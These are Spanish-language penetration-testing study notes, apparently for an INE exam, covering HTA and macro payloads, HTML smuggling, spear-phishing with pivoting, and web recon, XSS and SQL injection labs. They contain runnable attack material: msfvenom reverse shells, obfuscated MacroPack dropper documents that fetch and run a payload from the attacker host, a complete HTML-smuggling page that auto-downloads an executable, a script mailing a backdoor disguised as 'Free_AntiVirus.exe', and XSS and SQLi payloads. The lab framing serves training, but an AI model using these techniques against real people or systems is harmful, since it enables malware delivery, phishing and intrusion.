# - GotFocus se dispara cuando el usuario hace click en cualquier parte del doc
# - El control puede hacerse invisible para que el usuario no sospeche
# - Combinar ActiveX + payload real = técnica efectiva de evasión
```

#### HTML Applications (HTA)

```bash
#### HTML Applications (HTA)

# Qué es HTA
# Archivo HTML que se ejecuta como aplicación de escritorio via mshta.exe
# A diferencia de una página web, tiene acceso completo al sistema
# Bypasea el sandbox del browser — puede ejecutar comandos, acceder al filesystem, etc.
# Extensión: .hta
# Limitación: requiere Internet Explorer (usa el motor Trident/VBScript)
# En entornos corporativos con apps legacy, IE suele estar habilitado

# mshta.exe
# Intérprete nativo de Windows para archivos .hta
# Viene instalado por defecto en Windows — living off the land
# Permite ejecutar .hta remoto sin que el archivo toque el disco:
# mshta.exe http://<ip_kali>/payload.hta

# Vectores de entrega
# - Email con .hta adjunto
# - Link a .hta hosteado en servidor del atacante
# - Ejecutar desde Win+R: http://<ip_kali>/payload.hta

# Demo — HTA básico (Proof of Concept)
# Crear el archivo en el servidor web de Kali

cd /var/www/html
vim poc.hta

# Contenido del poc.hta:
<html>
    <head>
        <script>
            var payload = 'calc.exe'
            new ActiveXObject('Wscript.Shell').Run(payload);  # ejecuta el payload
        </script>
    </head>
    <body>
        <h1>HTA PoC</h1>
        <script>
            self.close();    # cierra la ventana HTA inmediatamente — evasión
        </script>
    </body>
</html>

# Servir via Apache
sudo systemctl start apache2
netstat -antp    # verificar que apache está escuchando en puerto 80

# Desde la máquina víctima (Windows):
# Abrir browser o Win+R → http://<ip_kali>/poc.hta
# mshta.exe interpreta el archivo y ejecuta el payload

# Puntos clave para el examen
# - ActiveXObject('Wscript.Shell').Run() es el equivalente a WScript.Shell en VBA
# - self.close() cierra la ventana HTA para no levantar sospechas
# - Se puede reemplazar 'calc.exe' por cualquier payload (reverse shell, dropper, etc.)
# - mshta.exe es un binario legítimo — evade application whitelisting
```

#### Automating Macro Development with MacroPack

```bash
# Qué es MacroPack
# Herramienta open source en Python 3 para automatizar desarrollo de macros
# Ofusca automáticamente para evadir AV
# Soporta múltiples formatos: .doc, .docm, .xls, .xlsm, .hta, .vba, etc.

# Comandos básicos
.\macro_pack.exe --help
.\macro_pack.exe --listformats      # ver formatos soportados
.\macro_pack.exe --listtemplates    # ver templates disponibles

# Ejemplo 1 — Macro simple que ejecuta un comando
echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc"
# -t CMD   — template de tipo comando
# -o       — ofuscar la macro generada
# -G       — generar el archivo de salida

# Ejemplo 2 — Combinar msfvenom con MacroPack
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<ip_kali> -f vba | \
    .\macro_pack.exe -o -G "resume.doc"
# msfvenom genera el payload en formato vba
# MacroPack lo ofusca y lo embebe en el .doc automáticamente

# Listener en Metasploit
msfconsole.bat
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip_kali>
run

# Servir el documento y obtener sesión
# Desde Windows donde está el doc:
python -m http.server 80
# Víctima descarga y abre el doc → sesión Meterpreter en Kali

# Ejemplo 3 — Dropper con MacroPack
# Genera un doc que descarga y ejecuta un payload desde un servidor
echo "http://<ip_kali>/update.exe" "update.exe" | \
    macro_pack.exe -t DROPPER -o -G "Accounts2022.xls"
# -t DROPPER — template dropper, descarga y ejecuta el payload
# El .xls generado descarga update.exe desde tu servidor y lo ejecuta

# Flujo dropper completo
# 1. Generar payload: msfvenom → update.exe
# 2. Servir: python -m http.server 80
# 3. Generar doc dropper con MacroPack
# 4. Víctima abre el .xls → descarga update.exe → ejecuta → sesión Meterpreter

# Ventaja de MacroPack vs manual
# - Ofuscación automática — evade AV sin trabajo extra
# - Un solo comando genera el doc listo para usar
# - Soporta múltiples formatos de Office
```

### ~ Delivery & Execution

#### File Smuggling with HTML & JavaScript

```bash
# Qué es HTML Smuggling
# Técnica para entregar payloads bypaseando filtros de red, firewalls y email gateways
# El payload viaja embebido en Base64 dentro del HTML — no como archivo adjunto
# El browser reconstruye y descarga el archivo en el lado del cliente
# Los filtros de red ven HTML/JS inofensivo, no un .exe

# Flujo completo
# 1. Generar payload .exe con msfvenom
# 2. Convertir a Base64
# 3. Embeber el Base64 en el HTML
# 4. Servir el HTML via Apache
# 5. Víctima visita la página → browser descarga el .exe automáticamente
# 6. Víctima ejecuta el .exe → sesión Meterpreter en Kali

# Paso 1 — Generar payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_kali> LPORT=4444 -f exe > backdoor.exe

# Paso 2 — Convertir a Base64
base64 -w0 backdoor.exe > base64.txt
# -w0 — sin saltos de línea, todo en una sola línea

# Paso 3 — Crear el HTML con el payload embebido
cd /var/www/html
rm *.html

vim index.html
# Contenido:
<html>
<body>
<script>
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);  // decodifica Base64
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

var file = '<pegar aqui el contenido de base64.txt>';
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});  // reconstruye el .exe
var fileName = 'msfstaged.exe';

// crear link invisible y hacer click automatico para forzar la descarga
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();                              // descarga automatica al visitar la pagina
window.URL.revokeObjectURL(url);
</script>
</body>
</html>

# Paso 4 — Servir y obtener sesión
service apache2 start
# Configurar listener en Metasploit (use exploit/multi/handler)
# Víctima visita http://<ip_kali> → descarga msfstaged.exe → ejecuta → sesión

# Por qué bypasea filtros
# - El payload no viaja como .exe adjunto sino como texto Base64 dentro de HTML
# - El browser lo reconstruye localmente — el tráfico de red parece HTML normal
# - Los email gateways y proxies no detectan el payload embebido
```
#### Access Via Spear Phishing Attachment

```bash
# Escenario
# demo.ine.local  (10.4.25.189) — acceso directo, puerto 25 SMTP abierto
# demo1.ine.local (10.4.31.237) — máquina interna, solo accesible via pivoting
# Objetivo: enviar backdoor por email a bob@ine.local y pivotar a demo1

# Paso 1 — Reconocimiento
nmap -sS -Pn -F demo.ine.local          # escaneo rápido, encontramos puerto 25
nmap -sV -p 25 demo.ine.local           # verificar servicio SMTP

# Paso 2 — Generar payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_kali> LPORT=4444 -f exe > backdoor.exe

# Paso 3 — Listener
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip_kali>
run

# Paso 4 — Script Python para enviar el email con el backdoor adjunto
# El servidor SMTP está abierto y no requiere autenticación — misconfiguration común
nano send_email.py
# Ver script completo abajo
python3 send_email.py

# send_email.py
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

fromaddr = "attacker@fake.net"
toaddr = "bob@ine.local"

msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Subject of the Mail"

body = "Body_of_the_mail"
msg.attach(MIMEText(body, 'plain'))

# Adjuntar el backdoor con nombre inofensivo
filename = "Free_AntiVirus.exe"     # nombre de ingeniería social
attachment = open("/root/backdoor.exe", "rb")

p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
msg.attach(p)

# Enviar via SMTP sin autenticación
s = smtplib.SMTP('demo.ine.local', 25)
text = msg.as_string()
s.sendmail(fromaddr, toaddr, text)
s.quit()

# Paso 5 — Pivoting a demo1.ine.local
# Una vez obtenida la sesión Meterpreter en demo:
shell
ping 10.4.31.237                    # verificar que demo puede llegar a demo1
run autoroute -s 10.4.31.237/20    # agregar ruta via sesión activa
bg

# Configurar proxy SOCKS para tunelizar tráfico
cat /etc/proxychains4.conf          # verificar puerto y versión
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit

# Escanear demo1 a través del proxy
proxychains nmap demo1.ine.local -sT -Pn -p 1-100   # puerto 80 abierto

# Port forwarding para acceder al puerto 80 de demo1 desde Kali
sessions -i 1
portfwd add -l 1234 -p 80 -r 10.4.31.237
portfwd list
nmap -sV -p 1234 localhost          # identificamos BadBlue 2.7

# Paso 6 — Explotar BadBlue en demo1
searchsploit badblue 2.7
bg
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS demo1.ine.local
set PAYLOAD windows/meterpreter/bind_tcp
exploit

# Paso 7 — Flag
shell
dir C:\
type C:\FLAG1.txt

# Puntos clave para el examen
# - SMTP abierto sin auth = podemos enviar emails como cualquier remitente
# - Nombre del adjunto es ingeniería social — "Free_AntiVirus.exe"
# - autoroute + socks_proxy = pivoting completo via sesión Meterpreter
# - portfwd permite escanear puertos internos directamente desde Kali
# - bind_tcp en vez de reverse_tcp porque la red interna no puede conectar a Kali
```

## 03 - Web Application Penetration Testing

### ~ Passive Information Gathering

#### Introduction to Web Enumeration & Information Gathering

```bash
# Qué es Information Gathering
# Es la primera fase de cualquier pentest, consiste en recolectar
# información sobre un individuo, empresa, sitio web o sistema objetivo

# Passive Information Gathering
# No hay interacción directa/activa con el target
# No requiere autorización especial (todo es información pública)
# Incluye:
#   - Ownership de dominios (WHOIS)
#   - Descubrir archivos/directorios ocultos o "disallowed" (robots.txt)
#   - IPs y registros DNS
#   - Tecnologías web usadas en el sitio
#   - Detección de WAF
#   - Subdominios (vía fuentes públicas)
#   - Estructura de contenido del sitio

# Active Information Gathering / Enumeration
# Interacción directa con el sistema objetivo
# SÍ requiere autorización (es "tocar" el sistema)
# Incluye:
#   - Descargar y analizar código fuente del sitio/app
#   - Port scanning y descubrimiento de servicios
#   - Web server fingerprinting
#   - Web application scanning
#   - DNS Zone Transfers
#   - Subdomain enumeration por Brute-Force
```

#### OWASP Web Security Testing Guide

```bash
# Qué es
# Es un framework/metodología de código abierto mantenida por OWASP
# (Open Web Application Security Project) que documenta cómo hacer
# testing de seguridad en aplicaciones web de forma estructurada
# No es una herramienta, es una GUÍA/CHECKLIST de metodología

# Para qué sirve
# Sirve como referencia estándar de la industria para pentesters,
# define QUÉ probar y CÓMO probarlo en cada fase de un engagement
# de web app pentesting
# Cubre desde la fase de recon/information gathering hasta la
# explotación de vulnerabilidades específicas (auth, sesión,
# input validation, lógica de negocio, APIs, etc.)

# Estructura general del WSTG
# Está organizado en categorías de testing, cada una con un ID
# Categorías principales:
#   - Information Gathering (WSTG-INFO)
#   - Configuration & Deployment Management (WSTG-CONF)
#   - Identity Management (WSTG-IDNT)
#   - Authentication (WSTG-ATHN)
#   - Authorization (WSTG-ATHZ)
#   - Session Management (WSTG-SESS)
#   - Input Validation (WSTG-INPV) -> incluye XSS, SQLi, etc.
#   - Error Handling (WSTG-ERRH)
#   - Cryptography (WSTG-CRYP)
#   - Business Logic (WSTG-BUSL)
#   - Client-Side Testing (WSTG-CLNT)
#   - API Testing (WSTG-APIT)

# Por qué es importante para el pentest
# - Da un enfoque ORDENADO y repetible, evita que el pentester se
#   salte pasos importantes durante el engagement
# - Es un estándar reconocido en la industria -> los reportes que
#   siguen esta metodología son más fáciles de validar/entender
#   por clientes y otros pentesters
# - Sirve como checklist: cada item tiene una descripción de qué
#   probar, cómo probarlo, y ejemplos de herramientas/técnicas

# Cómo se usa en la práctica
# El pentester recorre las categorías relevantes al scope del
# engagement, y por cada item de la guía documenta:
#   - Si aplica o no al target
#   - Qué se probó
#   - Resultado (vulnerable / no vulnerable)
#   - Evidencia (screenshots, requests, etc.)

# Puntos clave para el examen:
# - WSTG = metodología/checklist, NO es una herramienta automatizada
# - Mantenida por OWASP (misma organización del OWASP Top 10)
# - Da estructura a TODO el pentest de web apps, no solo a una fase
# - Cada categoría tiene un código WSTG-XXXX para referencia rápida

https://owasp.org/www-project-web-security-testing-guide/v42/
```
#### WHOIS

```bash
# Protocolo de consulta y respuesta para consultar bases de datos.
whois <domain-name> # Consultar información de ownership de un dominio
whois <ip-address> # También funciona pasando una IP en vez de un dominio
# Info que suele devolver un WHOIS lookup:
# - Registrant (dueño del dominio)
# - Registrar (empresa donde se registró el dominio)
# - Fechas de creación, expiración y última actualización
# - Nameservers asociados al dominio
# - Datos de contacto (a veces ocultos por WHOIS privacy/GDPR)

# HOST - Alternativa rápida para resolución DNS
# El comando host resuelve un dominio a su(s) IP(s) y también
# puede mostrar otros registros DNS (MX, NS, etc.)
host <domain-name>

# whois.domaintools.com
# Versión web del comando whois, útil cuando no se tiene acceso
# a terminal o se quiere una interfaz más visual/legible

# reverseip.domaintools.com
# Reverse IP Lookup — dado una IP, muestra TODOS los dominios que
# están hosteados en esa misma IP (útil en shared hosting)
# Esto es valioso en un pentest porque puede revelar otros
# dominios/apps del mismo cliente (o de terceros) que comparten
# infraestructura, ampliando la superficie de ataque conocida
```

#### Website Fingerprinting with Netcraft

```bash
# Qué es Netcraft
# Sitio web (netcraft.com) que permite hacer fingerprinting pasivo para obtener:
# - Sistema operativo del servidor
# - Web server usado (Apache, Nginx, IIS, etc.) y su versión
# - Historial de cambios de infraestructura/hosting del sitio
#   (útil para ver si migraron de proveedor, cambiaron de stack, etc.)
# - Fecha del primer registro del sitio (site since / netcraft rank)
# - Hosting provider y ubicación geográfica del servidor
# - Tecnologías usadas (frameworks, CMS, lenguajes)
# - Netblock owner (dueño del bloque de IPs)

# Por qué es útil en un pentest
# Ayuda a construir un perfil del target sin tocarlo directamente,
# lo que reduce el riesgo de ser detectado en fases tempranas
# Permite planear mejor las siguientes fases (ej: si se sabe que
# corre IIS, se buscan vulnerabilidades específicas de ese stack)

# Puntos clave para el examen:
# - Netcraft = herramienta de Passive Information Gathering
# - Sirve principalmente para: SO, web server, hosting history,
#   fecha de creación del sitio
# - No requiere autorización porque no interactúa directamente
#   con el servidor objetivo (usa su propia base de datos)
```

#### Passive DNS Enumeration

```bash
# DNS RECON
# A     -> hostname/dominio a IPv4
# AAAA  -> hostname/dominio a IPv6
# NS    -> nameserver del dominio
# MX    -> mail server del dominio
# CNAME -> alias de dominio
# TXT   -> texto libre (SPF, verificaciones, etc.)
# HINFO -> host information
# SOA   -> autoridad del dominio
# SRV   -> service records
# PTR   -> IP a hostname (reverse DNS)

# dnsrecon es un script en Python para hacer DNS enumeration:
# busca registros DNS, direcciones de correo, IPv4, IPv6, etc.
# asociados a un dominio

# Ver opciones disponibles
dnsrecon --help

# Enumerar todos los registros DNS de un dominio
dnsrecon -d <domain>

# Devuelve entre otros:
# - Registros A (IPv4)
# - Registros AAAA (IPv6)
# - Registros MX (mail servers)
# - Registros NS, TXT, SOA, etc.

# dnsdumpster.com
# Herramienta web para hacer DNS recon de forma pasiva,
# sin necesidad de terminal
# Muestra registros DNS, subdominios encontrados y en algunos
# casos un mapa visual de la infraestructura del dominio
```
#### Web Technology Fingerprinting

```bash

# Objetivo: identificar las tecnologías usadas en un sitio web
# (CMS, frameworks, lenguajes de programación, librerías JS,
# web server, analytics, etc.)
# Esto ayuda a enfocar la búsqueda de vulnerabilidades conocidas
# para el stack específico del target

# WHATWEB
# Herramienta CLI que escanea un sitio y detecta las tecnologías
# usadas en él (CMS, servidor web, lenguajes, plugins, etc.)

whatweb <domain>

# WAPPALYZER
# Es una herramienta (disponible como extensión de navegador y
# como sitio web) que también detecta tecnologías usadas en un
# sitio web, de forma similar a whatweb pero con interfaz visual

# Qué puede identificar Wappalyzer:
# - CMS (WordPress, Joomla, Drupal, etc.)
# - Frameworks de frontend/backend (React, Angular, Laravel, etc.)
# - Lenguajes de programación
# - Web server (Apache, Nginx, IIS)
# - Librerías de JavaScript
# - Herramientas de analytics/marketing
# - Certificados SSL/proveedores CDN
```

### ~ Active Information Gathering

#### Crawling with Burp Suite & OWASP ZAP

```bash
# Objetivo: mapear la estructura de un sitio web (páginas, endpoints,
# parámetros, formularios) para tener una visión completa de la
# superficie de ataque antes de buscar vulnerabilidades

# CRAWLING vs SPIDERING
# Son prácticamente sinónimos: recorrer un sitio web siguiendo enlaces
# y formularios para descubrir automáticamente todas las rutas
# accesibles y armar un mapa (sitemap) de la app. "Spidering" es el
# término más usado dentro de herramientas de pentesting (ej. Burp)


# OWASP ZAP
# Proxy de interceptación gratuito y open source
#
# - Se configura el navegador para pasar el tráfico por el proxy de ZAP
# - Mientras se navega manualmente, ZAP captura cada request/response
#   y las va agregando en tiempo real al árbol "Sites" del dashboard
# - Cuenta también con un "Spider" activo que recorre automáticamente
#   los links a partir de una URL semilla, sin navegación manual


# BURP SUITE
# Proxy de interceptación (Community gratis, Pro de pago), estándar
# de facto en pentesting web
#
# - Se configura el navegador para pasar el tráfico por el proxy
#   (127.0.0.1:8080 por defecto)
# - Cada request queda registrado en "Proxy > HTTP history"
# - En paralelo, "Target > Site map" arma automáticamente el árbol
#   de la app con cada página/endpoint visitado
# - También tiene su propio "Spider"/"Crawl" para descubrir contenido
#   automáticamente desde una URL semilla
```

#### Web Server Fingerprinting

```bash
# Objetivo: identificar el software y versión del servidor web
# para buscar vulnerabilidades conocidas asociadas a esa versión

nmap -sV -F <ip> # detecta versión de servicios en los puertos más comunes (top 100)
searchsploit apache 2.4.18 # busca exploits conocidos en Exploit-DB para esa versión
nmap -sV -p 80 --script=http-enum <ip> # enumera directorios/archivos comunes (admin panels, backups, etc.)
nmap -sV --script=banner <ip> # captura el banner del servicio, suele revelar software y versión

msfconsole
search auxiliary/scanner/http/http_version # busca módulo para detectar versión HTTP
use 0
set RHOSTS <ip-victima>
run

use auxiliary/scanner/http/brute_dirs # módulo para descubrir directorios por fuerza bruta
set RHOSTS <ip>
run

wget http://<ip>/index # descarga la página como archivo local para inspección
ls
cat index

lynx http://<ip> # navegador de texto en consola, útil para inspección rápida sin GUI

curl http://<ip> # obtener respuesta HTTP cruda
curl -I http://<ip> # solo headers (Server, X-Powered-By suelen revelar el software)

dirb http://<ip> /usr/share/metasploit-framework/data/wordlists/directory.txt # enumeración de directorios/archivos por fuerza bruta
```

#### Web Server Vulnerability Scanning with Nikto

```bash
# Objetivo: escanear el servidor/aplicación web en busca de
# vulnerabilidades conocidas, archivos peligrosos, configuraciones
# inseguras y versiones desactualizadas de software

nikto -h http://demo.ine.local # escaneo básico especificando la URL completa
nikto -h demo.ine.local # también funciona pasando solo el hostname

# EJEMPLO PRÁCTICO - Mutillidae II
# En Mutillidae: "OWASP 2017" > "A5: Broken Access Control" >
# "Insecure Direct Object References" > "Local File Inclusion"
# copiamos la URL vulnerable a LFI:
# http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php

nikto -h http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V
# -Tuning 5: limita el escaneo a una categoría específica de tests
# (5 = command injection / remote file retrieval)
# -Display V: muestra info verbose durante el escaneo (ej. redirects)

nikto -h http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm
# -o: guarda el output en un archivo
# -Format htm: define el formato del reporte de salida (html)

ls -l
# abrir el reporte generado en el navegador:
# file:///root/nikto.html

# EXPLOTACIÓN MANUAL DEL LFI DETECTADO
# probamos path traversal para leer archivos del sistema
http://demo.ine.local:80/index.php?page=../../../../../../../../etc/passwd
```

#### File & Directory Brute Force

```bash
gobuster dir --help # muestra todas las opciones disponibles del modo "dir"

gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt
# -u: URL objetivo
# -w: wordlist a usar para probar rutas

gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt -b 403,404
# -b: excluye (blacklist) códigos de estado HTTP de los resultados,
# en este caso 403 (forbidden) y 404 (not found)

gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
# -x: agrega extensiones a cada palabra de la wordlist (prueba
# archivo.php, archivo.xml, archivo.txt además del nombre base)
# -r: sigue redirecciones automáticamente

gobuster dir -u http://demo.ine.local/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
# mismo escaneo pero apuntando a un subdirectorio específico
# ("/data") ya descubierto previamente
```

#### Automated Recon with OWASP Amass

```bash
# Objetivo: reconocimiento automatizado de subdominios e
# infraestructura de un dominio (DNS enumeration, subdomain
# discovery, network mapping) combinando fuentes pasivas y
# técnicas activas de fuerza bruta

sudo apt-get install amass # instalación de la herramienta
amass --help # muestra los subcomandos y opciones disponibles
amass enum -d zonetransfer.me # modo de enumeración de subdominios de forma pasiva y activa
amass enum -passive -d zonetransfer.me # solo usa fuentes de información pasivas
amass enum -d zonetransfer.me -passive -src -dir /home/kali/Desktop/ZTME/
# -src: muestra la fuente de datos de cada resultado encontrado
# -dir: directorio donde se guarda la data/resultados del escaneo

amass enum -d zonetransfer.me -src -ip -brute -dir /home/kali/Desktop/ZTME_Brute/
# -ip: muestra las IPs asociadas a cada subdominio encontrado
# -brute: agrega fuerza bruta de subdominios (con wordlist) además
# de las fuentes pasivas/activas normales

amass intel -active -whois -d zonetransfer.me -dir /home/kali/Desktop/ZTME_Intel/
# intel: modo de inteligencia para descubrir dominios relacionados
# al target (no enumera subdominios, busca organización/infra)
# -active: permite técnicas activas de recolección
# -whois: usa datos de WHOIS para encontrar dominios relacionados
# a la misma organización
 ```

### ~ XSS

#### Identifying & Exploiting Reflected XSS Vulnerabilities

```bash
# XSS Reflected 
# El payload NO se guarda en el servidor/base de datos, solo se refleja 
# de vuelta en la respuesta HTTP inmediata a la petición que lo contiene 
# (por eso "reflected" - rebota y ya)

sudo apt-get install wpscan # instalación
wpscan --help # opciones

# escaneo básico sin api token
wpscan --url <url> # escaneo normal
wpscan --url <url> --enumerate p --plugin-detection aggressive # escanear plugins de manera agresiva pero más ruidosa

# escaneo con api
wpscan --url <url> --enumerate p --plugin-detection aggressive --api-token <token>
# El --api-token permite consultar la base de datos de vulnerabilidades de WPScan (WPVulnDB)
# así WPScan puede indicar si algún plugin/tema/core detectado tiene CVEs conocidos

# buscamos exploits/PoCs conocidos
searchsploit Relevanssi
# También se puede buscar directamente en exploit-db.com y revisar el PoC

# El PoC muestra un parámetro vulnerable en la URL del plugin que refleja
# input del usuario sin sanitizar -> Reflected XSS
# Payload de ejemplo (URL-encoded) para el parámetro "tab":
/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+

# Se edita la URL reemplazando el dominio por el del WordPress target,
# se carga en el navegador (autenticado como admin/víctima) y el JS se
# ejecuta -> salta el alert() del XSS

# Qué se puede lograr con un XSS (más allá del alert() de prueba):
# - Robo de cookies de sesión (document.cookie) -> session hijacking
# - Keylogging o captura de datos ingresados en formularios de la víctima
# - Realizar acciones en nombre de la víctima (ej: crear un usuario admin
#   si la víctima es un admin logueado) sin que se dé cuenta
# - Redirigir a la víctima a un sitio de phishing para robar credenciales
```

#### Identifying & Exploiting Stored XSS Vulnerabilities

```bash
# XSS Stored
# El payload SÍ se guarda en el servidor/base de datos (a diferencia del
# Reflected). Se ejecuta cada vez que la víctima carga la página/sección
# donde quedó almacenado

# Instalación de dependencias y herramienta
git clone <repo-mybbscan>       # clonar repositorio de MyBBscan
pip install huepy                # instalar dependencia huepy

cd MyBBscan  
./scan.py # Escaneo con MyBBscan
# se ingresa la URL del foro target cuando lo solicite

# Alternativa: buscar el plugin/versión vulnerable directamente en exploit-db
# y revisar el PoC correspondiente

# Payload de prueba encontrado:
<BODY ONLOAD=alert('XSS')>

# Se inyecta el payload en un campo del foro (post, perfil, firma, etc.)
# que no sanitiza el input. Al guardarse y cargarse la página nuevamente
# se ejecuta el alert() -> confirma el Stored XSS

# Qué se puede lograr con un Stored XSS (impacto generalmente MAYOR que
# el Reflected, ya que afecta a TODOS los usuarios que vean el contenido):
# - Robo masivo de cookies de sesión de todos los usuarios que visiten
#   el post/página infectada (incluyendo administradores)
# - Propagación de malware o redirecciones automáticas a phishing
# - Creación de gusanos XSS (self-propagating) si el payload también
#   se auto-replica al postear en nombre de la víctima
# - Compromiso persistente sin depender de ingeniería social por link
```

#### Identifying & Exploiting DOM-Based XSS Vulnerabilities

```bash
# XSS DOM-Based
# El payload nunca viaja al servidor ni se guarda en él — todo el ataque
# ocurre en el lado del cliente (navegador), manipulando directamente el
# DOM/JavaScript de la página. El servidor entrega el mismo HTML/JS
# siempre; es el propio código JS del cliente el que procesa un dato
# controlado por el atacante (ej: la URL) de forma insegura

# Target: demo.ine.local

# Al revisar el código fuente HTML se encuentra:
<script>
    var statement = document.URL.split("statement=")[1];
    document.getElementById("result").innerHTML = eval(statement);
</script>

# Línea 1: lee la URL completa y guarda todo lo que venga después de
#          "statement=" (el atacante controla ese fragmento vía la URL)
# Línea 2: ejecuta ese valor como código JS usando eval() -> ahí está
#          el fallo, no se sanitiza ni valida el input antes de ejecutarlo

# Payload de prueba (robo de cookies) directo en la URL:
alert(document.cookie)

# Se agrega como valor del parámetro statement en la URL, se carga la
# página y el JS del cliente ejecuta el alert() mostrando las cookies
# de sesión -> confirma el DOM-Based XSS

# Qué se puede lograr con un DOM-Based XSS:
# - Robo de cookies de sesión sin que el payload pase por el servidor
#   (dificulta su detección en logs del backend/WAF)
# - Ejecución de cualquier JS arbitrario en el contexto de la víctima
#   (redirecciones, keylogging, acciones en su nombre, etc.)
# - Al no tocar el servidor, muchas defensas del lado backend
#   (sanitización, WAF a nivel servidor) no detectan ni bloquean el ataque
```

### ~ SQLi

#### Finding SQL Injection Vulnerabilities

```bash
# Finding SQLi con OWASP ZAP
# ZAP permite automatizar la búsqueda de SQLi lanzando múltiples payloads
# (fuzzing) contra los parámetros de la app, para detectar respuestas
# anómalas (errores de DB, diferencias de tiempo/contenido) que indiquen
# una inyección exitosa

# Flujo:
# 1. Se interceptan/identifican los parámetros de la app (forms, URL params)
# 2. Se usa el fuzzer de ZAP para probar una lista de payloads SQLi
#    contra esos parámetros de forma automatizada
# 3. Se revisan las respuestas en busca de indicadores de SQLi
#    (errores de sintaxis SQL, cambios en el comportamiento de la app, etc.)

# Repositorio de payloads usado para pruebas manuales/complementarias:
# https://github.com/payload-box/sql-injection-payload-list
# Contiene listas de payloads ya armados para distintos motores de DB
# y técnicas (auth bypass, union-based, error-based, etc.), útiles para
# probar manualmente en la web cuando el fuzzing automático no es claro

# Qué se puede lograr al confirmar un punto de inyección con este método:
# - Identificar rápidamente qué parámetros son vulnerables antes de
#   pasar a la fase de explotación (Error-Based, Union-Based, etc.)
# - Ahorrar tiempo probando decenas de payloads de forma automatizada
#   en vez de manualmente uno por uno
```

#### Exploiting Error-Based SQL Injection Vulnerabilities 

```bash
# In-Band SQLi: el atacante envía el ataque y recibe el resultado por
# el mismo canal (misma respuesta HTTP)
# Error-Based (subtipo de In-Band): fuerza errores en la DB para que
# el mensaje de error revele información del schema/contenido

# LAB: PHPMyRecipes - Error-Based SQLi

# Búsqueda del exploit
searchsploit PHPMyRecipes SQL injection
# Encontrado:
# Vulnerable web page:  /dosearch.php
# Vulnerable parameter: words_exact

sqlmap -u "http://demo.ine.local/dosearch.php" --data "words_exact=" -p words_exact --method POST

# Preguntas interactivas de sqlmap:
# "Do you want to skip test payloads specific for other DBMSes?"        -> y
# "do you want to include all tests for 'MySQL' extending provided      -> y
#  level (1) and risk (1) values?"
# "Do you want to keep testing the others (if any)?"                    -> n
# (ya con MySQL confirmado, no hace falta seguir probando otros DBMS)

# sqlmap identifica y confirma 3 tipos de payloads explotables:

# Type: error-based
words_exact=' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a767171,(SELECT (ELT(9194=9194,1))),0x7178627171,0x78))s), 8446744073709551610, 8446744073709551610)))#

# Type: time-based blind
words_exact=' IN BOOLEAN MODE) AND (SELECT 4679 FROM (SELECT(SLEEP(5)))oAuq)#

# Type: UNION query
words_exact=' IN BOOLEAN MODE) UNION ALL SELECT NULL,CONCAT(0x716a767171,0x52536f4563764f69547a756f524a67796a476e725175444d6c56696753475a68755a564d6c6f4879,0x7178627171)#

# En el inspector del navegador, ubicar el input "words_exact" y
# eliminar el atributo maxlength (el campo del form limita caracteres
# y el payload es más largo que el límite por defecto)

# Se inyecta el payload error-based directamente en el campo del form:
' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a767171,(SELECT (ELT(9194=9194,1))),0x7178627171,0x78))s), 8446744073709551610, 8446744073709551610)))#

# El mensaje de error de la DB confirma la inyección

# Se modifica el payload para extraer la versión del servidor MySQL
# usando la función version():
' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178626a71,(SELECT (ELT(1595=1595,1))),0x7178707071,version()))s), 8446744073709551610, 8446744073709551610)))#

# El error de la DB ahora incluye la versión de MySQL en su mensaje

# Qué se puede lograr con Error-Based SQLi:
# - Extraer datos arbitrarios de la DB (versión, nombres de tablas,
#   columnas, contenido) leyendo únicamente los mensajes de error
# - Mapear el schema completo de la base de datos sin necesidad de
#   una respuesta "limpia" en la página (solo con el error se filtra info)
# - Con herramientas como sqlmap, automatizar todo el proceso hasta
#   volcar (dump) tablas completas de la base de datos
```

#### Exploiting Union-Based SQL Injection Vulnerabilities

```bash
# SQL Injection Union-Based - Recordatorio rápido
# Explota el operador UNION para combinar una consulta maliciosa con la
# consulta original y así extraer datos de OTRAS tablas de la base de
# datos, dentro del mismo resultado que devuelve la app
# Requisito: el número de columnas y tipos de dato deben coincidir entre
# el SELECT original y el inyectado

# Target: http://results.abc.univ.edu:5000

# Paso 1: probar si el campo es vulnerable a SQLi
# Payload (confirma inyección forzando una condición siempre verdadera):
